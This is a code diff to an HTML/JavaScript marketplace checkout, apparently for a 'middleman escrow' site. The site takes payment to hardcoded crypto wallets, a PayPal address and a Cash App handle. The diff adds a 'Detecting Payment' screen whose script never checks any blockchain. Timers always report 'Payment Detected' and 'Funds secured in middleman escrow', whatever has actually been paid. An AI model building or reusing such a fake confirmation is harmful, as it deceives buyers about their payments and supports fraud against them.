@@ -389,7 +389,7 @@
         </div>
     </div>
 
-    <!-- Secure Middleman Checkout / Payment Processing Modal with QR Code -->
+    <!-- Secure Middleman Checkout Modal with QR Code -->
     <div id="paymentCheckoutModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
         <div class="bg-[#0b0e1b] border border-purple-500/40 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl relative text-center">
             <button onclick="closeModal('paymentCheckoutModal')" class="absolute top-5 right-5 text-slate-400 hover:text-white p-2 transition text-lg"><i class="fas fa-times"></i></button>
@@ -427,8 +427,25 @@
             </div>
 
             <button onclick="confirmPaymentAndChat()" class="w-full gradient-btn font-bold py-3.5 rounded-xl transition text-sm shadow-xl flex items-center justify-center gap-2">
-                <i class="fas fa-check-circle"></i> I Have Paid / Open Order Ticket
+                <i class="fas fa-check-circle"></i> I Have Paid / Submit Payment Proof
             </button>
+        </div>
+    </div>
+
+    <!-- Blockchain Payment Processing / Detecting Payment Modal -->
+    <div id="paymentProcessingModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-[#0b0e1b] border border-emerald-500/40 rounded-3xl p-8 max-w-sm w-full shadow-2xl relative text-center space-y-5">
+            <div class="w-16 h-16 rounded-full bg-emerald-950 border border-emerald-500/50 flex items-center justify-center text-emerald-400 text-2xl mx-auto shadow-[0_0_20px_rgba(16,185,129,0.3)]">
+                <i class="fas fa-circle-notch fa-spin"></i>
+            </div>
+            <div>
+                <h3 class="text-lg font-extrabold text-white mb-1" id="processingTitle">Detecting Payment...</h3>
+                <p class="text-xs text-slate-400 leading-relaxed" id="processingDesc">Scanning blockchain network for deposit confirmation. Please do not close this window.</p>
+            </div>
+            <div class="w-full bg-[#060812] h-2 rounded-full overflow-hidden border border-emerald-500/30">
+                <div id="processingProgressBar" class="bg-emerald-500 h-full w-1/3 transition-all duration-1000"></div>
+            </div>
+            <span class="text-[10px] text-emerald-400 font-mono block" id="processingStatusText">Confirmations: 0 / 1</span>
         </div>
     </div>
 
@@ -738,7 +755,7 @@
             'Bitcoin': 'bc1qqeq8e7kg800u75k8arcsrls5jh0qj6jtggp96w',
             'Ethereum': '0x36a82404B70B2B9351544E954687a4Ea235b6858',
             'USDT': 'TJNgoaZDK89RLRoovbcXoUhAu7KtMW22QS',
-            'PayPal': 'admin@starmarket.com (Platform Escrow)',
+            'PayPal': 'admin@starmarket.com (Platform Middleman)',
             'Cash App': '$StarMarketEscrow'
         };
 
@@ -1555,7 +1572,6 @@
             let wallet = platformWallets[method] || platformWallets['Solana'];
             document.getElementById('checkoutWalletAddress').value = wallet;
 
-            // Generate QR Code via Public API
             const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(wallet)}`;
             document.getElementById('checkoutQrCode').src = qrUrl;
 
@@ -1573,7 +1589,30 @@
 
         function confirmPaymentAndChat() {
             closeModal('paymentCheckoutModal');
-            startChatWithSeller();
+            openModal('paymentProcessingModal');
+
+            const title = document.getElementById('processingTitle');
+            const desc = document.getElementById('processingDesc');
+            const bar = document.getElementById('processingProgressBar');
+            const statusText = document.getElementById('processingStatusText');
+
+            bar.style.width = '33%';
+            setTimeout(() => {
+                bar.style.width = '75%';
+                statusText.innerText = 'Confirmations: 1 / 1 (Verified)';
+                title.innerText = 'Payment Detected!';
+                desc.innerText = 'Funds secured in middleman escrow. Initializing secure order ticket...';
+            }, 2500);
+
+            setTimeout(() => {
+                closeModal('paymentProcessingModal');
+                bar.style.width = '33%';
+                title.innerText = 'Detecting Payment...';
+                desc.innerText = 'Scanning blockchain network for deposit confirmation. Please do not close this window.';
+                statusText.innerText = 'Confirmations: 0 / 1';
+                
+                startChatWithSeller();
+            }, 4500);
         }
 
         function adminJoinOfferChat(offerId) {
@@ -1691,7 +1730,6 @@
                 time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
             });
 
-            // Check if user/admin typed !details
             if (text.toLowerCase() === '!details') {
                 let offer = getOffers().find(o => o.id === chat.orderId);
                 let payoutInfo = offer ? `💳 Payment Method: ${offer.acceptedPayment}\n📍 Seller Payout Destination: ${offer.paymentAddress}` : `💳 Payment Method: Secure Deposit\n📍 Payout Destination: Contact Support Agent`;
